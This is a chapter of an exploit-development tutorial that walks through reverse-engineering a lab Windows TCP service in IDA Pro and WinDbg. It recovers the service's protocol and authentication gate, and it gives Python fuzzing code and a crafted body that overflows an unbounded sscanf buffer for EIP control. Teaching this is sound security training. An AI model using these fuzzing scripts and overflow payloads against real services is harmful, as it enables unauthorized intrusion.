## 2. Finding the bug from the binary

You do not have source code on an engagement. This section teaches you to find
the vulnerability using only IDA Pro (static) and WinDbg (dynamic). Every fact
must be extracted from disassembly, string cross-references, and runtime
observation.

Treat every rename in IDA as a hypothesis. Rename aggressively to keep your
bearings, but be willing to undo names when later evidence contradicts them.
A label is a claim about behavior you have observed, not a fact about the
program.

The method has five stages: **recover the protocol boundary**, **recover the
dispatcher**, **establish reachability dynamically**, **fuzz the reachable
handlers**, and **analyze the crashing parser**.

---

### 2.1 Recover the protocol boundary

Open `service.exe` in IDA Pro. The service is a TCP listener, so start where
the network meets the process.

**Find the recv wrapper.** In the Imports tab, locate `recv` (from
`ws2_32.dll`). Press `x` for cross-references. One of the xrefs will usually
be a helper that repeatedly calls `recv` until the requested byte count has
been satisfied. If multiple wrappers exist, identify the one that accepts a
buffer pointer and a requested length as arguments. Rename it provisionally
(e.g. `recv_loop`). Press `x` on the wrapper to find its callers.

Two calls stand out in the same parent function. The first reads exactly 12
bytes into a stack local:

```
push    0Ch                               ; len = 12
lea     eax, [ebp-XXh]
push    eax                               ; buf = local struct
push    [ebp+sock]
call    recv_loop
```

Immediately after the 12-byte read, the code validates the buffer:

```
cmp     dword ptr [ebp-XXh], 53564C56h
jnz     loc_reject

movzx   eax, word ptr [ebp-XXh+4]
...
cmp     dword ptr [ebp-XXh+8], 2000h
ja      loc_too_large
```

Record what you observe. Do not assign names yet:

```
offset  width  observation
------  -----  ---------------------------------------------------
+0x00   4      compared against fixed constant 0x53564C56
+0x04   2      16-bit load, value passed to a later function
+0x06   2      16-bit load, tested with bitwise AND
+0x08   4      unsigned comparison against 0x2000, rejects if above
```

The second `recv_loop` call reads `[ebp-XXh+8]` bytes (the value at offset
+0x08) into a heap buffer allocated with `malloc(0x2001)`. After the read:

```
mov     byte ptr [eax+edi], 0
```

A NUL terminator. The body is treated as a C string downstream, so any
embedded NUL would truncate it. Note `0x00` as a likely bad character.

At this point you have hypotheses about what each offset does. Do not rename
the fields until you see them used consistently across multiple functions.
The offset at `+0x04` might be a dispatch key or a version field or something
else entirely. Observation in the next stage will settle it.

---

### 2.2 Recover the dispatcher

After the header and body are read and validated, the 16-bit value at offset
`+0x04` is passed to another function. Inside that function, it becomes the
operand of a chain of comparisons. In IDA's graph view the shape is
unmistakable: a long vertical spine of diamond-shaped compare-and-branch nodes.

```
movzx   eax, word ptr [ebp+hdr_field_04]

cmp     eax, 1
jz      loc_A

cmp     eax, 2
jz      loc_B

cmp     eax, 10h
jz      loc_C

cmp     eax, 20h
jz      loc_D

cmp     eax, 21h
jz      loc_E

cmp     eax, 22h
jz      loc_F

cmp     eax, 30h
jz      loc_G

cmp     eax, 40h
jz      loc_H

cmp     eax, 50h
jz      loc_I

cmp     eax, 0FFh
jz      loc_J
```

This confirms offset `+0x04` is a dispatch key. You can now provisionally call
it `opcode`. Record the handler targets with generic labels:

```
field_04 value   handler
--------------   -------
0x01             handle_op01
0x02             handle_op02
0x10             handle_op10
0x20             handle_op20
0x21             handle_op21
0x22             handle_op22
0x30             handle_op30
0x40             handle_op40
0x50             handle_op50
0xFF             handle_opFF
```

Rename each block in IDA. These are provisional labels based solely on the
dispatch value. Every handler executes in the context of an attacker-controlled
request. Many receive the body pointer directly; others may ignore it or use
only header fields. At this stage, every handler remains a potential attack
surface until you can observe its behavior. Behavioral analysis is next.

---

### 2.3 Establish reachability dynamically

Static analysis shows you the handlers exist. Dynamic analysis tells you which
ones you can reach and what preconditions they impose.

**Breakpoint every handler entry.** In WinDbg, set a breakpoint at the start
of each handler block. Write a minimal client that sends each dispatch value
with a short body:

```python
import socket, struct

MAGIC = 0x53564C56

def frame(opcode, body, flags=0):
    return struct.pack("<IHHI", MAGIC, opcode, flags, len(body)) + body

def probe(ip, port, opcode, body=b"test"):
    s = socket.create_connection((ip, port))
    s.sendall(frame(opcode, body))
    resp = s.recv(512)
    print(f"  0x{opcode:04x}: response {resp[:8].hex()}")
    s.close()
```

Send each value and record which handlers fire, which return errors, and which
behave differently depending on prior state.

Most handlers fire and return a response. But when you hit `handle_op21`
(value `0x21`), the response contains a status that differs from the others.
Double-click into it in IDA. The first instructions are:

```
mov     esi, [ebp+arg_0]
cmp     dword ptr [esi+18h], 0
jz      short loc_reject
```

The rejection path pushes a small integer status code and a string reference.
Look up the string in `.rdata`:

```
.rdata:0042XXXX  "not authenticated"
```

So field `+0x18` on the object pointed to by the first argument is some kind
of gating flag, and the string tells you its purpose. The handler will not
proceed unless that field is nonzero.

**Find the setter.** You need to locate instructions that write to offset
`+0x18` on the same object. IDA does not know this is a struct, so what you
are actually searching for is instructions of the form `mov [reg+18h], 1`
where `reg` holds the same runtime pointer. Search for references to offset
`+0x18` in functions that receive the same first-argument object. One approach:
binary-search (`Alt+B`) for the byte sequence corresponding to
`mov dword ptr [reg+18h], imm32(1)`. Another: examine each handler that takes
the same first argument and scan for writes to `+0x18`.

In `handle_op02` you will find:

```
mov     dword ptr [esi+18h], 1
```

This handler also references a string in `.rdata` that looks like a format
pattern for parsing a username. Based on the observed behavior (it accepts
input, it sets a flag, the rejection string says "not authenticated"), you can
now provisionally rename:

```
handle_op02  -->  handle_auth       (sets the gate flag)
handle_op21  -->  handle_gated_21   (requires the gate flag)
field +0x18  -->  auth_flag         (nonzero = authenticated)
```

**Verify the gate.** Send `0x02` with a body that matches the format pattern
you found in `.rdata`, then send `0x21` again. Observe that `handle_gated_21`
now passes the gate check and proceeds deeper into a sub-function call. That
sub-function receives the body pointer. This is where the interesting parsing
will happen.

Repeat this process for `handle_op22`. You will find the same `+0x18` check.
Two handlers are gated, making them higher-value targets: the gate suggests
they perform more sensitive operations.

At this point your handler map looks like:

```
value   label              notes
-----   -----------------  ----------------------------------------
0x01    handle_op01        no body parse, returns fixed response
0x02    handle_auth        sets auth_flag at +0x18
0x10    handle_op10        calls a sub-function with the body
0x20    handle_op20        calls a sub-function with the body
0x21    handle_gated_21    gated by auth_flag, calls a sub-function
0x22    handle_gated_22    gated by auth_flag, calls a sub-function
0x30    handle_op30        calls a sub-function with the body
0x40    handle_op40        calls a sub-function with the body
0x50    handle_op50        returns counters, no body parse
0xFF    handle_opFF        returns -1 (probably closes connection)
```

Some handlers call sub-functions that receive the body; some do not. The ones
that pass attacker bytes deeper are the ones worth fuzzing.

---

### 2.4 Fuzz the reachable handlers

You know the protocol, the dispatch values, and the gate. You do not yet know
what format each handler expects. The goal is to find which handler crashes,
not to craft a precise exploit payload.

This is **protocol-aware differential testing**: same valid header, same
authentication sequence, increasing body sizes, one dispatch value at a time.
Begin with arbitrary padding to determine whether oversized input alone reaches
the vulnerable code. If a handler consistently rejects malformed input before
crashing, that rejection is itself a signal: it tells you a parser stands
between the body and the copy. You will recover that parser's expectations in
the next step and generate the simplest body that satisfies them. The goal is
to reach the copy routine, not to emulate legitimate application behavior.

```python
import socket, struct

MAGIC = 0x53564C56

def frame(opcode, body, flags=0):
    return struct.pack("<IHHI", MAGIC, opcode, flags, len(body)) + body

def fuzz_opcode(ip, port, opcode, sizes):
    for sz in sizes:
        try:
            s = socket.create_connection((ip, port), timeout=5)
            # authenticate first so gated handlers are reachable
            s.sendall(frame(0x0002, b"USER fuzz\n"))
            s.recv(512)
            # send the target value with sz bytes of padding
            s.sendall(frame(opcode, b"A" * sz))
            resp = s.recv(512)
            status = struct.unpack("<H", resp[:2])[0] if len(resp) >= 2 else -1
            print(f"  0x{opcode:04x}  size={sz:5d}  status=0x{status:04x}")
            s.close()
        except (ConnectionError, TimeoutError):
            print(f"  0x{opcode:04x}  size={sz:5d}  *** CRASH ***")
            return True
    return False

sizes = [16, 64, 128, 256, 512, 1024, 2000]

for op in [0x01, 0x02, 0x10, 0x20, 0x21, 0x22, 0x30, 0x40, 0x50]:
    fuzz_opcode("192.168.x.x", 9999, op, sizes)
```

With WinDbg attached, run this against all dispatch values. Record what happens
at each size:

```
value   sizes 16-2000           observation
-----   --------------------    -------------------------------------------
0x01    all return OK           no body parsing, safe
0x02    all return OK           auth handler, no overflow
0x10    all return error        sub-function rejects malformed body, safe
0x20    all return error        sub-function rejects malformed body, safe
0x21    returns error at all    body format rejected before reaching copy
0x22    CRASH at size ~300+     thread dies or exception fires
0x30    rejects at size 128+    sub-function length-checks, safe
0x40    all return OK           round-trips data, safe
0x50    all return OK           counters only, safe
```

**Opcode 0x22 crashes.** In WinDbg, examine the crash:

```
!exchain
```

If the SEH chain shows `41414141` in the handler field, the overflow
overwrites an SEH registration record. Note this path for later (Chapter 15).

**Opcode 0x21 returns errors but does not crash.** That is suspicious. The
handler is gated and calls a sub-function, which rejects the raw `A` body.
The sub-function expects a specific format, and the format validation fails
before reaching the copy. This means the copy is reachable only when the body
satisfies the parser's expectations.

Go back to IDA. Double-click into `handle_gated_21`'s sub-function. Find the
`sscanf` (or similar parsing call). Its format string is in `.rdata`. Read it:

```
.rdata:0042XXXX  "%31s %63s %s"
```

Three conversion specifiers, each `%s` variant. `%s` in `sscanf` consumes a
whitespace-delimited token: it reads non-whitespace characters until it hits a
space, tab, newline, or NUL. Therefore the minimal body that satisfies this
format is three whitespace-separated strings. Their semantic meaning is
irrelevant to reaching the copy; only the lexical structure matters.

Adjust the fuzz body:

```python
body = b"AAA BBB " + b"C" * sz
```

`"AAA"` satisfies the first `%31s`, `"BBB"` satisfies the second `%63s`, and
`sz` `C` characters feed the third `%s`. Re-fuzz value `0x21` with this body
shape:

```
0x21    "AAA BBB " + C*sz
  size=  16   status=0x0000   (accepted)
  size=  64   status=0x0000   (accepted)
  size= 128   status=0x0000   (accepted)
  size= 256   status=0x0000   (accepted)
  size= 512   *** CRASH ***
```

In WinDbg:

```
(xxxx.xxxx): Access violation - code c0000005 (first chance)
eip=43434343 esp=0133e320 ebp=43434343
```

`eip=43434343`. Direct EIP control. The third token overflowed a stack buffer
and smashed the saved return address. You now have two crashing dispatch
values: `0x22` (SEH path) and `0x21` (direct EIP). The direct EIP path is
simpler. Focus on it.

---

### 2.5 Analyze the crashing parser

The crash confirmed an overflow in `handle_gated_21`'s sub-function. Now
recover the exact vulnerability from the disassembly.

Find the `sscanf` call site. IDA shows the arguments being pushed:

```
lea     eax, [ebp-100h]                   ; destination 3
push    eax
lea     ecx, [ebp-140h]                   ; destination 2
push    ecx
lea     edx, [ebp-160h]                   ; destination 1
push    edx
push    offset aFmt                       ; "%31s %63s %s"
push    [ebp+arg_body]                    ; source (attacker body)
call    _sscanf
```

Measure the destination buffer sizes from their stack offsets. The distance
between consecutive `ebp` offsets gives you each buffer's allocation, assuming
the compiler placed the locals contiguously. Always verify there are no
intervening locals or alignment gaps before treating the entire distance as one
buffer. Check IDA's stack-frame view (`View > Open subviews > Stack variables`)
to see all locals in the frame:

```
destination     offset       size
-----------     ----------   ----
[ebp-160h]      -0x160       0x160 - 0x140 = 0x20 = 32 bytes
[ebp-140h]      -0x140       0x140 - 0x100 = 0x40 = 64 bytes
[ebp-100h]      -0x100       0x100         = 256 bytes (to saved EBP)
```

Now match each destination to its format specifier:

```
specifier   width limit   destination size   verdict
---------   -----------   ----------------   -------
%31s        31 chars      32 bytes           bounded, safe
%63s        63 chars      64 bytes           bounded, safe
%s          none          256 bytes           UNBOUNDED
```

The third specifier has no width limit. `sscanf` writes into the 256-byte
buffer at `[ebp-100h]` until it hits whitespace or NUL in the source string.
The source is the attacker body, which can be up to 0x2000 bytes. A third
token longer than 256 bytes overflows the buffer, overwrites the saved EBP
at `[ebp]`, then the saved return address at `[ebp+4]`.

**Check for stack cookies.** Examine the function epilogue. If there is no
call to `__security_check_cookie` or `__GSHandlerCheck`, the corrupted return
address is popped directly into EIP by `ret`. That is consistent with a
`/GS-` build. If you see a cookie check, the binary was built with `/GS`,
and the overflow will trigger `__report_gsfailure` instead of giving you EIP
control. Rebuild with `/GS-`.

You can now rename with confidence:

```
handle_gated_21     -->  handle_config_set    (the format "set"/"get" + key + value)
sub-function        -->  parse_config_set     (the vulnerable parser)
field_04            -->  opcode               (confirmed as dispatch key)
+0x06               -->  flags                (bitfield, observed with AND tests)
+0x08               -->  body_len             (bounds-checked length)
```

These names are now supported by observed behavior across multiple functions:
the dispatch chain, the gate check, the parser format, and the crash.

> **Source confirmation.** If you have access to the source, you can verify
> that the recovered behavior matches `parse_config_set()` in `parser.c`. The
> format string `"%31s %63s %s"` and the buffer declaration `char value[256]`
> confirm exactly what the disassembly showed. Two other parsers
> (`parse_status_query` with `%63s`, `parse_log_upload` with a length check
> before `memcpy`) are the safe paths you eliminated during fuzzing.

---

### 2.6 The transferable method

You found a stack overflow in a binary without reading a line of source:

1. **Protocol recovery.** `recv` xrefs gave you the header layout, the magic
   constant, and the body-length cap. Fields were recorded as offsets and
   promoted to names only after repeated observation.

2. **Dispatcher recovery.** A `cmp/jz` chain revealed every dispatch value
   and its handler. Generic labels were assigned and renamed only as behavior
   was observed.

3. **Reachability analysis.** A struct-field check at `+0x18` gated two
   handlers. Finding the corresponding setter in another handler revealed
   an authentication prerequisite. The search required identifying writes to
   `[reg+18h]` across functions that receive the same first-argument pointer,
   then verifying the base register refers to the same runtime object.

4. **Protocol-aware fuzzing.** Increasing body sizes with valid headers and
   an authenticated session found two crashing handlers. One handler required
   a format-conformant body (three whitespace-separated tokens) to reach the
   vulnerable copy; raw padding was rejected before the overflow could occur.
   Adjusting the body shape based on the handler's `.rdata` format string
   triggered the crash.

5. **Parser deep-dive.** Cross-referencing the format string and measuring
   stack offsets from `lea` instructions identified the unbounded conversion.
   The epilogue check (cookie or no cookie) determined exploitability.

> **Design decision.** The bug is not "sscanf is dangerous." The bug is:
> *attacker-controlled input, copied into a fixed-size stack buffer, through
> an unbounded conversion, on a reachable path.* All four conditions must
> hold. Two other parsers in this binary have `sscanf` or `memcpy` calls
> that look suspicious but are width-limited or length-checked. Eliminating
> them is as important as finding the real one.

---

---

[← Previous](01-recon.md) · [Index](00-index.md) · [Next →](03-choosing-a-gadget-source.md)
